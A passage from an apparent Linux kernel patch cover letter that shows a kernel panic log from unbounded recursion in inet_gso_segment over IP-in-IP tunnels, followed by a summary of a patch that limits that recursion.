  15:	89                   	.byte 0x89
[   12.155941] RSP: 0018:ffffa96040affff8 EFLAGS: 00010246
[   12.155943] RAX: 0000000000000103 RBX: 0000000000000d9c RCX: 000000000000001e
[   12.155943] RDX: 000000000000ac00 RSI: ffff9d96438cfec0 RDI: 0000000000000000
[   12.155944] RBP: 0000000000000014 R08: 0000000000000004 R09: ffff9d964cd6b000
[   12.155944] R10: ffff9d96438ce01e R11: ffff9d9643a25b80 R12: ffff9d9642506ce8
[   12.155944] R13: 0000000000000d70 R14: ffff9d96424f5400 R15: 000061264fc001a8
[   12.155951] FS:  00007f29282a6540(0000) GS:ffff9d970c50d000(0000) knlGS:0000000000000000
[   12.155951] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   12.155952] CR2: ffffa96040afffe8 CR3: 000000000cee5002 CR4: 0000000000370ef0
[   12.155952] Call Trace:
[   12.155972]  <TASK>
[   12.155974]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155975]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155977]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155978]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155979]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155981]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155982]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155983]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155984]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155986]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155987]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155988]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155989]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155991]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155992]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155993]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155994]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155995]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155997]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155998]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.155999]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156000]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156002]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156003]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156004]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156005]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156007]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156008]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156009]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156010]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156012]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156013]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156014]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156015]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156017]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156018]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156019]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156020]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156022]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156023]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156024]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156025]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156027]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156028]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156029]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156030]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156031]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156033]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156034]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156035]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156036]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156038]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156039]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156040]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156041]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156043]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156049]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156051]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156052]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156053]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156054]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156061]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156062]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156064]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156065]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156066]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156068]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156069]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156070]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156072]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156073]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156074]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156075]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156077]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156078]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156079]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156081]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156082]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156083]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156085]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156086]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156087]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156088]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156090]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156091]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156092]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156094]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156095]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156096]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156097]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156099]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156100]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156101]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156103]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156104]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156105]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156107]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156108]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156109]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156110]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156112]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156113]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156114]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156116]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156117]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156118]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156119]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156121]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156122]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156123]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156125]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156126]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156127]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156129]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156130]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156131]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156132]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156134]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156135]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156136]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156138]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156139]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156140]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156141]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156143]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156144]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156145]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156147]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156148]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156149]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156151]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156152]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156153]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156154]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156156]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156157]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156158]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156160]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156161]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156162]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156163]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156165]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156166]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156167]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156169]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156170]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156171]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156173]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156174]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156175]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156176]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156178]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156179]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156180]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156182]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156183]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156184]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156186]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156187]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156188]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156189]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156191]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156192]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156193]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156195]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156196]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156197]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156198]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156200]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156201]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156202]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156204]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   12.156205]  skb_mac_gso_segment (net/core/gso.c:53)
[   12.156207]  __skb_gso_segment (net/core/gso.c:124)
[   12.156208]  validate_xmit_skb.isra.0 (include/net/gso.h:83 net/core/dev.c:4044)
[   12.156211]  __dev_queue_xmit (net/core/dev.c:4865)
[   12.156213]  ip_finish_output2 (include/linux/netdevice.h:3446 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
[   12.156215]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
[   12.156217]  ? __pfx_ip_finish_output (include/net/dst.h:470 (discriminator 7))
[   12.156218]  iptunnel_xmit (net/ipv4/ip_tunnel_core.c:97)
[   12.156220]  ip_tunnel_xmit (net/ipv4/ip_tunnel.c:848)
[   12.156222]  ipip_tunnel_xmit (net/ipv4/ipip.c:316)
[   12.156224]  dev_hard_start_xmit (include/linux/netdevice.h:5400 include/linux/netdevice.h:5409 net/core/dev.c:3889 net/core/dev.c:3905)
[   12.156225]  ? validate_xmit_skb.isra.0 (net/core/dev.c:4067)
[   12.156227]  __dev_queue_xmit (net/core/dev.c:4878)
[   12.156228]  ? get_page_from_freelist (mm/page_alloc.c:1870 mm/page_alloc.c:3946)
[   12.156231]  ip_finish_output2 (include/net/neighbour.h:560 (discriminator 2) net/ipv4/ip_output.c:236 (discriminator 2))
[   12.156232]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
[   12.156233]  ? __pfx_ip_finish_output (include/net/dst.h:470 (discriminator 7))
[   12.156235]  __ip_queue_xmit (net/ipv4/ip_output.c:533)
[   12.156236]  __tcp_transmit_skb (net/ipv4/tcp_output.c:1716 (discriminator 4))
[   12.156238]  tcp_write_xmit (net/ipv4/tcp_output.c:1734 net/ipv4/tcp_output.c:3062)
[   12.156240]  tcp_sendmsg_locked (net/ipv4/tcp.c:1394)
[   12.156241]  tcp_sendmsg (net/ipv4/tcp.c:1451)
[   12.156242]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
[   12.156245]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
[   12.156246]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   12.156248]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   12.156250] RIP: 0033:0x7f29281cdeec
[   12.156251] Code: 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 19 45 31 c9 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 64 c3 0f 1f 00 55 48 83 ec 20 48 89 54 24 10
All code
========
   0:	89 02                	mov    %eax,(%rdx)
   2:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   9:	eb b8                	jmp    0xffffffffffffffc3
   b:	0f 1f 00             	nopl   (%rax)
   e:	41 89 ca             	mov    %ecx,%r10d
  11:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  18:	00 
  19:	85 c0                	test   %eax,%eax
  1b:	75 19                	jne    0x36
  1d:	45 31 c9             	xor    %r9d,%r9d
  20:	45 31 c0             	xor    %r8d,%r8d
  23:	b8 2c 00 00 00       	mov    $0x2c,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 64                	ja     0x96
  32:	c3                   	ret
  33:	0f 1f 00             	nopl   (%rax)
  36:	55                   	push   %rbp
  37:	48 83 ec 20          	sub    $0x20,%rsp
  3b:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 64                	ja     0x6c
   8:	c3                   	ret
   9:	0f 1f 00             	nopl   (%rax)
   c:	55                   	push   %rbp
   d:	48 83 ec 20          	sub    $0x20,%rsp
  11:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
[   12.156251] RSP: 002b:00007ffeb8ad9df8 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[   12.156252] RAX: ffffffffffffffda RBX: 00007ffeb8ad9f58 RCX: 00007f29281cdeec
[   12.156253] RDX: 0000000000010000 RSI: 000055c69fbfa2a0 RDI: 0000000000000003
[   12.156253] RBP: 0000000000000001 R08: 0000000000000000 R09: 0000000000000000
[   12.156254] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000010000
[   12.156254] R13: 000055c69fbfa2a0 R14: 0000000000000000 R15: 0000000000000003
[   12.156255]  </TASK>
[   12.156255] Modules linked in:
[   12.156257] ---[ end trace 0000000000000000 ]---
[   12.156257] RIP: 0010:inet_gso_segment (net/ipv4/af_inet.c:1404 (discriminator 1))
[   12.156259] Code: 8e 3f 02 00 00 4d 8b 4c 24 10 4d 23 b9 00 02 00 00 41 89 7c 24 4c 66 41 89 84 24 b6 00 00 00 8b 46 18 89 c7 81 e7 00 00 00 80 <89> 7c 24 04 c1 e8 10 83 e0 01 88 04 24 4a 8b 04 c5 40 d0 ef b0 89
All code
========
   0:	8e 3f                	mov    (%rdi),%?
   2:	02 00                	add    (%rax),%al
   4:	00 4d 8b             	add    %cl,-0x75(%rbp)
   7:	4c 24 10             	rex.WR and $0x10,%al
   a:	4d 23 b9 00 02 00 00 	and    0x200(%r9),%r15
  11:	41 89 7c 24 4c       	mov    %edi,0x4c(%r12)
  16:	66 41 89 84 24 b6 00 	mov    %ax,0xb6(%r12)
  1d:	00 00 
  1f:	8b 46 18             	mov    0x18(%rsi),%eax
  22:	89 c7                	mov    %eax,%edi
  24:	81 e7 00 00 00 80    	and    $0x80000000,%edi
  2a:*	89 7c 24 04          	mov    %edi,0x4(%rsp)		<-- trapping instruction
  2e:	c1 e8 10             	shr    $0x10,%eax
  31:	83 e0 01             	and    $0x1,%eax
  34:	88 04 24             	mov    %al,(%rsp)
  37:	4a 8b 04 c5 40 d0 ef 	mov    -0x4f102fc0(,%r8,8),%rax
  3e:	b0 
  3f:	89                   	.byte 0x89

Code starting with the faulting instruction
===========================================
   0:	89 7c 24 04          	mov    %edi,0x4(%rsp)
   4:	c1 e8 10             	shr    $0x10,%eax
   7:	83 e0 01             	and    $0x1,%eax
   a:	88 04 24             	mov    %al,(%rsp)
   d:	4a 8b 04 c5 40 d0 ef 	mov    -0x4f102fc0(,%r8,8),%rax
  14:	b0 
  15:	89                   	.byte 0x89
[   12.156259] RSP: 0018:ffffa96040affff8 EFLAGS: 00010246
[   12.156260] RAX: 0000000000000103 RBX: 0000000000000d9c RCX: 000000000000001e
[   12.156260] RDX: 000000000000ac00 RSI: ffff9d96438cfec0 RDI: 0000000000000000
[   12.156261] RBP: 0000000000000014 R08: 0000000000000004 R09: ffff9d964cd6b000
[   12.156261] R10: ffff9d96438ce01e R11: ffff9d9643a25b80 R12: ffff9d9642506ce8
[   12.156261] R13: 0000000000000d70 R14: ffff9d96424f5400 R15: 000061264fc001a8
[   12.156265] FS:  00007f29282a6540(0000) GS:ffff9d970c50d000(0000) knlGS:0000000000000000
[   12.156266] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   12.156266] CR2: ffffa96040afffe8 CR3: 000000000cee5002 CR4: 0000000000370ef0
[   12.156267] Kernel panic - not syncing: Fatal exception in interrupt
[   12.157113] Kernel Offset: 0x2de00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   13.708589] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---

-----END crash log-----

Best regards,
Zihan Xi


Zihan Xi (1):
  net: gso: limit recursive IP-in-IP segmentation

 include/net/gso.h      | 9 +++++++++
 net/core/gso.c         | 1 +
 net/ipv4/af_inet.c     | 3 +++
 net/ipv6/ip6_offload.c | 3 +++
 4 files changed, 16 insertions(+)

-- 
2.43.0

